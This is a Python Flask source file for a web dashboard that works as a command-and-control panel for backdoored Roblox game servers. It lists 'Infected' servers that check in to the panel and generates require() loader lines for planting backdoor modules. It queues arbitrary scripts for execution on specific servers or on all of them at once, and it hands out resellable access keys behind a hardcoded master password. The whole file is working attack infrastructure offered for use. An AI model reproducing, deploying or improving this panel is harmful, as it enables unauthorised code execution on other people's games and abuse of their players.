import requests, time, os, uuid, random, string
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "vantage_v30_final_tier"
MASTER_ADMIN_PW = "SkibidiToiletSigmaRizzler" 

# PERSISTENT DATA
global_servers = {} 
user_sessions = {}
valid_keys = {}
mass_execute_queue = []

def generate_key(k_type="standard"):
    k = "VANTAGE-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    valid_keys[k] = k_type
    return k

BASE_CSS = """
:root { --gold: #ffd700; --bg: #050505; --card: rgba(15, 15, 15, 0.9); --border: rgba(255, 215, 0, 0.2); --accent: #bc13fe; --master: #ff4444; }
* { box-sizing: border-box; transition: 0.3s; }
body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
.navbar { background: rgba(0,0,0,0.95); border-bottom: 2px solid var(--border); display: flex; justify-content: space-around; padding: 18px; z-index: 100; }
.nav-item { color: #444; cursor: pointer; font-weight: 900; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
.active-nav { color: var(--gold); border-bottom: 2px solid var(--gold); text-shadow: 0 0 10px var(--gold); }
.viewport { flex: 1; padding: 25px; overflow-y: auto; }
.card { background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 15px; backdrop-filter: blur(15px); margin-bottom: 15px; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; max-width: 1200px; margin: auto; }
.server-thumb { width: 100%; height: 130px; object-fit: cover; border-radius: 10px; border: 1px solid #222; margin-bottom: 10px; }
.server-info { font-size: 11px; margin-bottom: 8px; }
.server-info b { color: var(--gold); }
.btn { background: var(--gold); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; }
.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }

@keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
.searching, .executing { animation: pulse 0.8s infinite !important; background: #333 !important; color: #fff !important; }

.hidden { display: none !important; }
.key-badge { background: #111; padding: 10px; border-radius: 8px; font-family: monospace; border: 1px solid var(--gold); margin-bottom: 5px; text-align: center; }
input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--border); padding: 15px; color: #fff; width: 100%; border-radius: 12px; outline: none; margin-bottom: 10px; }
textarea { color: #0f0; font-family: 'Consolas', monospace; height: 180px; resize: none; }
.require-output { background: #111; padding: 15px; border-radius: 10px; color: #0f0; font-family: monospace; font-size: 13px; border: 1px dashed var(--master); cursor: pointer; }
"""

DASH_HTML = """
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>""" + BASE_CSS + """</style></head>
<body>
    {% if not logged_in %}
    <div style="display:flex; align-items:center; justify-content:center; height:100vh;">
        <div class="card" style="width:340px; text-align:center;">
            <h1 style="color:var(--gold);">VANTAGE</h1>
            <form method="POST" action="/login"><input type="password" name="pw" placeholder="ACCESS KEY"><button class="btn">LOGIN</button></form>
        </div>
    </div>
    {% else %}
    <div class="navbar">
        <div class="nav-item active-nav" onclick="tab('live', this)">Infected</div>
        <div class="nav-item" onclick="tab('require_hub', this)">RequireHub</div>
        <div class="nav-item" onclick="tab('exec', this)">Executor</div>
        <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
        {% if is_admin %}<div class="nav-item" style="color:var(--accent);" onclick="tab('admin_panel', this)">Admin Panel</div>{% endif %}
        {% if is_master %}<div class="nav-item" style="color:var(--master);" onclick="tab('master', this)">Master Panel</div>{% endif %}
    </div>
    <div class="viewport">
        <div id="live" class="tab"><div id="server_grid" class="grid"></div></div>

        <div id="require_hub" class="tab hidden">
            <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
                <h2 style="color:var(--gold);">RequireHub</h2>
                <input id="module_id" placeholder="Enter Asset ID (e.g. 123456789)">
                <button class="btn" onclick="generateRequire()">CREATE REQUIRE</button>
                <div id="require_display" class="hidden" style="margin-top:20px;">
                    <p style="font-size:10px; color:#666;">CLICK TO COPY:</p>
                    <div id="require_text" class="require-output" onclick="copyText()">require(0).test(plr.Name)</div>
                </div>
            </div>
        </div>

        <div id="exec" class="tab hidden">
            <div class="card" style="max-width: 700px; margin: auto;">
                <p style="font-size:11px;">TARGET: <b id="exec_target" style="color:var(--gold);">NONE</b></p>
                <textarea id="code_area" placeholder="-- PASTE SCRIPT HERE"></textarea>
                <button id="exec_btn" class="btn" onclick="execute()">EXECUTE</button>
            </div>
        </div>

        <div id="white" class="tab hidden">
            <div class="card" style="max-width: 400px; margin: auto; text-align: center;">
                <input id="w_input" placeholder="Roblox Username">
                <button id="w_btn" class="btn" onclick="addWhite()">WHITELIST</button>
                <div id="profile_box" class="hidden" style="margin-top:20px;">
                    <img id="p_img" src="" style="width:80px; border-radius:50%;"><h3 id="p_name"></h3>
                    <button class="btn" style="background:#ff4444; color:#fff;" onclick="resetWhite()">RESET</button>
                </div>
            </div>
        </div>
        
        <div id="admin_panel" class="tab hidden">
            <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
                <h2 style="color:var(--accent);">Admin Panel</h2>
                <button class="btn" onclick="genKey('standard', 'key_list_admin')">GENERATE STANDARD KEY</button>
                <div id="key_list_admin" style="margin-top:15px;"></div>
            </div>
        </div>

        {% if is_master %}
        <div id="master" class="tab hidden">
            <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
                <h2 style="color:var(--master);">Master Panel</h2>
                <textarea id="mass_code" style="height:80px;" placeholder="-- MASS SCRIPT (ALL SERVERS)"></textarea>
                <button class="btn" style="background:var(--master); color:#fff;" onclick="massExec()">SEND TO ALL</button>
                <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
                <div style="display:flex; gap:10px;">
                    <button class="btn" onclick="genKey('standard', 'key_list_master')">GEN STANDARD</button>
                    <button class="btn" style="background:#bc13fe; color:#fff;" onclick="genKey('admin', 'key_list_master')">GEN ADMIN</button>
                </div>
                <div id="key_list_master" style="margin-top:15px;"></div>
            </div>
        </div>
        {% endif %}
    </div>
    {% endif %}
<script>
    function tab(name, el) { document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); document.getElementById(name).classList.remove('hidden'); el.classList.add('active-nav'); }
    
    function generateRequire() {
        let id = document.getElementById('module_id').value || "0";
        document.getElementById('require_text').innerText = `require(${id}).test(plr.Name)`;
        document.getElementById('require_display').classList.remove('hidden');
    }

    function copyText() {
        let text = document.getElementById('require_text').innerText;
        navigator.clipboard.writeText(text);
        alert("Copied to clipboard!");
    }

    function sync() {
        fetch('/api/global_signals').then(r => r.json()).then(data => {
            let sHtml = "";
            for(let id in data.servers) { 
                let s = data.servers[id]; 
                sHtml += `<div class="card"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b>GAME:</b> ${s.name}<br><b>PLRS:</b> ${s.p_count}</div><button class="btn" onclick="window.location.href='roblox-player:1+launchmode:play+gameinstanceid:${id}+placeid:${s.place_id}'">JOIN</button></div>`; 
            }
            document.getElementById('server_grid').innerHTML = sHtml || "Waiting for logs...";
        });
        fetch('/api/personal_data').then(r => r.json()).then(data => {
            if(data.whitelist) { 
                document.getElementById('exec_target').innerText = data.whitelist.name; 
                document.getElementById('p_img').src = data.whitelist.img; 
                document.getElementById('p_name').innerText = data.whitelist.name; 
                document.getElementById('profile_box').classList.remove('hidden'); 
                document.getElementById('w_input').classList.add('hidden'); 
                document.getElementById('w_btn').classList.add('hidden');
            } else { 
                document.getElementById('exec_target').innerText = "NONE"; 
                document.getElementById('profile_box').classList.add('hidden'); 
                document.getElementById('w_input').classList.remove('hidden'); 
                document.getElementById('w_btn').classList.remove('hidden'); 
            }
        });
    }

    function genKey(type, tid) { fetch('/api/admin/gen_key', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type: type})}).then(r => r.json()).then(d => { document.getElementById(tid).innerHTML = `<div class="key-badge" style="color:${type=='admin'?'#bc13fe':'#ffd700'}">${d.key}</div>` + document.getElementById(tid).innerHTML; }); }
    function massExec() { fetch('/api/admin/mass_execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('mass_code').value})}); }
    function execute() { let btn = document.getElementById('exec_btn'); btn.classList.add('executing'); fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('code_area').value})}).then(() => setTimeout(()=>btn.classList.remove('executing'), 1000)); }
    function addWhite() { let btn = document.getElementById('w_btn'); btn.classList.add('searching'); fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}).then(() => { btn.classList.remove('searching'); sync(); }); }
    function resetWhite() { fetch('/api/reset', {method:'POST'}).then(sync); }
    setInterval(sync, 3000);
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(DASH_HTML, logged_in=session.get('logged_in'), is_master=session.get('is_master'), is_admin=session.get('is_admin'))

@app.route('/login', methods=['POST'])
def login():
    pw = request.form.get("pw")
    if pw == MASTER_ADMIN_PW: session.update({'logged_in': True, 'is_master': True, 'is_admin': True, 'sid': 'MASTER'})
    elif pw in valid_keys:
        k_type = valid_keys[pw]
        session.update({'logged_in': True, 'is_master': False, 'is_admin': (k_type == 'admin'), 'sid': str(uuid.uuid4())})
        del valid_keys[pw]
    return redirect(url_for('index'))

@app.route('/api/global_signals')
def get_global(): return jsonify({"servers": global_servers})

@app.route('/api/personal_data')
def get_personal():
    sid = session.get('sid')
    if sid not in user_sessions: user_sessions[sid] = {"whitelist": None, "queue": []}
    return jsonify(user_sessions[sid])

@app.route('/api/admin/gen_key', methods=['POST'])
def admin_gen():
    k_type = request.json.get("type")
    if not session.get("is_admin"): return jsonify({"key": "DENIED"}), 403
    if k_type == "admin" and not session.get("is_master"): return jsonify({"key": "DENIED"}), 403
    return jsonify({"key": generate_key(k_type)})

@app.route('/api/whitelist', methods=['POST'])
def add_white():
    sid, user = session.get('sid'), request.json.get("user")
    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [user]}).json()
        if r.get("data") and sid:
            uid, name = r["data"][0]["id"], r["data"][0]["requestedUsername"]
            img = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png").json()["data"][0]["imageUrl"]
            user_sessions[sid] = {"whitelist": {"name": name, "img": img}, "queue": []}
    except: pass
    return jsonify({"ok": True})

@app.route('/api/reset', methods=['POST'])
def reset_white():
    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["whitelist"] = None
    return jsonify({"ok": True})

@app.route('/api/execute', methods=['POST'])
def run_exec():
    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["queue"].append(request.json.get("code"))
    return jsonify({"ok": True})

@app.route('/roblox/sync', methods=['POST'])
def roblox_sync():
    global mass_execute_queue
    data = request.json
    jid = data.get("jobId")
    if jid:
        if jid not in global_servers:
            try:
                t = requests.get(f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={data.get('game_id')}&size=150x150&format=Png").json()
                thumb = t["data"][0]["imageUrl"] if t.get("data") else ""
            except: thumb = ""
            global_servers[jid] = {"thumb": thumb, "place_id": data.get("game_id")}
        global_servers[jid].update({"name": data.get("name"), "p_count": len(data.get("players", []))})
    
    all_cmds = []
    for mc in mass_execute_queue: all_cmds.append({"user": "ALL", "code": mc})
    if mass_execute_queue: mass_execute_queue = []
    
    players = [p.lower() for p in data.get("players", [])]
    for sid, info in user_sessions.items():
        if info.get("whitelist") and info["whitelist"]["name"].lower() in players:
            for c in info["queue"]: all_cmds.append({"user": info["whitelist"]["name"], "code": c})
            user_sessions[sid]["queue"] = []
    return jsonify({"commands": all_cmds})

@app.route('/api/admin/mass_execute', methods=['POST'])
def admin_mass():
    if session.get('is_master'): mass_execute_queue.append(request.json.get("code"))
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
